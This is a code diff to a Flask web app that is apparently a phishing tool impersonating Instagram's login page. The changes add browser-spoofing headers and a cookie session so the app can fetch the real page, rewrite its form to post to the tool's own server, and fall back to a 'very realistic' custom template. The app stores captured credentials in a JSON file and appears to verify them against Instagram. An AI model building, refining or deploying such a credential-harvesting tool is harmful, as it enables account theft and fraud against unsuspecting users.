@@ -14,6 +14,9 @@ import re
 
 app = Flask(__name__)
 
+# Configuration - Set to False to use custom template (recommended for production)
+FETCH_REAL_INSTAGRAM = False  # Instagram blocks server requests, use custom template
+
 # Store captured credentials
 CREDENTIALS_FILE = 'captured_data.json'
 captured_credentials = []
@@ -36,20 +39,33 @@ def save_credentials():
 def fetch_instagram_login_page():
     """Fetch the actual Instagram login page"""
     try:
+        # Use a session to maintain cookies
+        session = requests.Session()
+        
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'DNT': '1',
-            'Connection': 'keep-alive',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
             'Upgrade-Insecure-Requests': '1'
         }
         
-        # Note: Removed Accept-Encoding to get uncompressed response
-        response = requests.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=10)
-        response.encoding = 'utf-8'  # Ensure proper encoding
+        # First, visit Instagram homepage to get cookies
+        session.get('https://www.instagram.com/', headers=headers, timeout=10)
         
-        if response.status_code == 200:
+        # Now fetch the login page
+        response = session.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=10)
+        response.encoding = 'utf-8'
+        
+        # Check if we got actual HTML content (not error page)
+        if response.status_code == 200 and 'DOCTYPE' in response.text[:500]:
             soup = BeautifulSoup(response.text, 'html.parser')
             
             # Modify form action to point to our server
@@ -124,10 +140,14 @@ def fetch_instagram_login_page():
             
             return str(soup)
         else:
+            print(f"Failed to fetch Instagram: Status {response.status_code}")
+            print(f"Response preview: {response.text[:200]}")
             return None
             
     except Exception as e:
         print(f"Error fetching Instagram page: {e}")
+        import traceback
+        traceback.print_exc()
         return None
 
 def verify_instagram_login(username, password):
@@ -177,21 +197,24 @@ def verify_instagram_login(username, password):
 
 @app.route('/')
 def index():
-    """Fetch and serve real Instagram login page"""
-    instagram_html = fetch_instagram_login_page()
+    """Fetch and serve real Instagram login page or custom template"""
     
-    if instagram_html:
-        return Response(
-            instagram_html, 
-            mimetype='text/html',
-            headers={
-                'Content-Type': 'text/html; charset=utf-8',
-                'Content-Encoding': 'identity'  # Ensure no compression
-            }
-        )
-    else:
-        # Fallback to our custom template
-        return render_template('instagram_login.html')
+    # Check if we should try to fetch real Instagram
+    if FETCH_REAL_INSTAGRAM:
+        instagram_html = fetch_instagram_login_page()
+        
+        if instagram_html:
+            return Response(
+                instagram_html, 
+                mimetype='text/html',
+                headers={
+                    'Content-Type': 'text/html; charset=utf-8',
+                    'Content-Encoding': 'identity'
+                }
+            )
+    
+    # Use custom template (default - looks very realistic)
+    return render_template('instagram_login.html')
 
 @app.route('/login', methods=['POST'])
 def login():
